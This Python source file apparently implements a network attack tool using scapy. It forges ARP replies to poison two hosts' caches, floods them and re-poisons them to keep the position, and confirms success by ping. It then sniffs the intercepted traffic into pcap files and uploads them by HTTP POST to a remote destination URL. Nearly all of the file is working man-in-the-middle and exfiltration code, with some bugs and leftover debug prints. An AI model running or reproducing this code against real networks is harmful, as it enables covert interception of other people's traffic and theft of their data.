from scapy.layers.l2 import Ether, ARP
from scapy.layers.inet import IP, ICMP
from scapy.all import *
from DataStructures import *
from threading import Thread
import time
from collections import deque
from requests import post
from time import sleep


class AttackTools:
    @staticmethod
    def build_arp_response(attacker: Host, target1: Host, target2: Host):
        # TODO: Add error detection
        ether_index = 0
        arp_index = 1

        arp = Ether() / ARP()
        arp[ether_index].src = attacker.get_hwaddr()
        arp[arp_index].hwsrc = attacker.get_hwaddr()
        arp[arp_index].psrc = target1.get_addr()
        arp[arp_index].hwdst = target2.get_hwaddr()
        arp[arp_index].pdst = target2.get_addr()

        return arp

    @staticmethod
    def poison(attacker: Host, target1: Host, target2: Host, bidirectional: bool, flood: bool):
        arp1 = AttackTools.build_arp_response(attacker, target1, target2)
        if not flood:
            sendp(arp1, verbose=False)

        if bidirectional:
            arp2 = AttackTools.build_arp_response(attacker, target2, target1)
            if not flood:
                sendp(arp2, verbose=False)

        if flood:
            poisoners = [ARPPoisoner(arp1, target1, target2)]
            thread1 = Thread(target=poisoners[0].poison)
            thread1.start()

        if flood and bidirectional:
            poisoners.append(ARPPoisoner(arp2, target2, target1))
            thread2 = Thread(target=poisoners[1].poison)
            thread2.start()

        if flood:
            print("Poisoning targets...")
            thread1.join()
            thread2.join()
            threads = [Thread]
            for poisoner in poisoners:
                thread = Thread(target=poisoner.persistence)
                threads.append(thread)
                thread.start()
            print()
            print("Poisoning succeeded")

    @staticmethod
    def sniff(must_send: bool, interface: Interface, destination: Destination = None):
        sniffer = Sniffer(must_send, interface, destination)
        sniffer.begin_sniff()
        return sniffer


class ARPPoisoner:
    def __init__(self, pkt, victim: Host, host: Host):
        self.flood_thread = Thread
        self.ping_send_thread = Thread
        self.ping_listen_thread = Thread
        self.confirm_thread = Thread
        self.persistence_thread = Thread
        self.killed = False
        self.arp_pkt = pkt
        self.ping_pkt = IP(dst=victim.get_addr(), src=host.get_addr())/ICMP()
        self.host = host
        self.victim = victim
        self.success = False
        self.quick_confirm_bool = bool

    def kill(self):
        self.killed = True

    def set_confirm_bool(self, confirm: bool):
        self.quick_confirm_bool = confirm

    def set_success(self, success: bool):
        self.success = success

    def get_thread(self):
        return self.flood_thread

    def poison(self):
        self.flood_thread = Thread(target=self.sendp_flood)
        self.flood_thread.start()
        self.confirm_thread = Thread(target=self.confirm_poison)
        self.confirm_thread.start()
        self.flood_thread.join()
        self.confirm_thread.join()

    def sendp_flood(self):
        while not self.killed:
            sendp(self.arp_pkt, verbose=False)
            sleep(0.1)

    def confirm_poison(self):
        self.ping_listen_thread = Thread(target=self.listen_ping)
        self.ping_listen_thread.start()
        self.ping_send_thread = Thread(target=self.send_ping)
        self.ping_send_thread.start()

        self.ping_listen_thread.join()
        self.ping_send_thread.join()

    def listen_ping(self):
        filt = "icmp and dst host " + self.victim.get_addr()

        sniff(count=1, filter=filt)
        self.success = True
        print("Successfully poisoned " + self.victim.get_addr())

    def send_ping(self):
        while not self.success:
            send(self.ping_pkt, verbose=False)
            sleep(1)

        self.kill()

    def persistence(self):
        while True:
            print("test2")
            sendp(self.arp_pkt, verbose=False)
            self.quick_confirm()
            if not self.success:
                print("Poisoning at " + self.victim.get_addr() + " failed, re-poisoning")
                self.poison()

            sleep(5)

    def quick_confirm(self):
        filt = "icmp and dst host " + self.victim.get_addr()

        print("testing " + self.victim.get_addr())

        self.quick_confirm_bool = False

        send(self.ping_pkt, verbose=False)

        sniff(count=1, filter=filt, timeout=1, prn=self.set_confirm_bool(True))

        self.success = self.quick_confirm_bool


class Sniffer:
    def __init__(self, must_send: bool, interface: Interface, destination: Destination):
        self.thread = Thread
        self.killed = False
        self.must_send = must_send
        self.to_send = deque([])
        self.interface = interface
        self.destination = destination

    def kill(self):
        self.killed = True

        # The sniff function will only terminate once it receives a packet, so send a meaningless packet to ensure it
        # terminates immediately.
        pkt = IP(dst=self.interface.get_active_hosts()[0].get_addr())
        send(pkt, iface=self.interface.get_name(), verbose=False)

    def is_killed(self):
        return self.killed

    def get_next_to_send(self):
        return self.to_send.popleft()

    def get_to_send_que(self):
        return self.to_send

    def get_thread(self):
        return self.thread

    def begin_sniff(self):
        self.thread = Thread(target=self.continuous_sniff)
        self.thread.start()

    def sniff_single(self, file: str, filt: str = ""):
        if self.must_send:
            file_size_limit = 1000
        else:
            file_size_limit = 0

        conf.iface = self.interface.get_name()

        sniff(prn=lambda x: wrpcap(file, x, append=True), count=file_size_limit, filter=filt,
              stop_filter=lambda x: self.is_killed())

    @staticmethod
    def gen_file_name():
        cur_time = time.localtime()
        result = "pcap_files/" + time.strftime("%Y_%m_%d_%H_%M_%S", cur_time) + ".pcap"
        return result

    def continuous_sniff(self):
        filt = ""

        if self.to_send:
            n = 0
            ip_list = self.destination.get_ip_list()

            for ip in ip_list:
                filt = filt + "dst host "
                filt = filt + ip

                if n != len(ip_list) - 1:
                    filt = filt + " and "

                n = n + 1

        while not self.killed:
            filename = Sniffer.gen_file_name()
            self.to_send.append(filename)
            self.sniff_single(filename, filt)
            if self.must_send:
                self.send_pcap()

    def send_pcap(self):
        while True:
            response = post(self.destination.get_url(), files={'file': open(self.get_next_to_send(), 'rb')})
            if response.ok:
                break
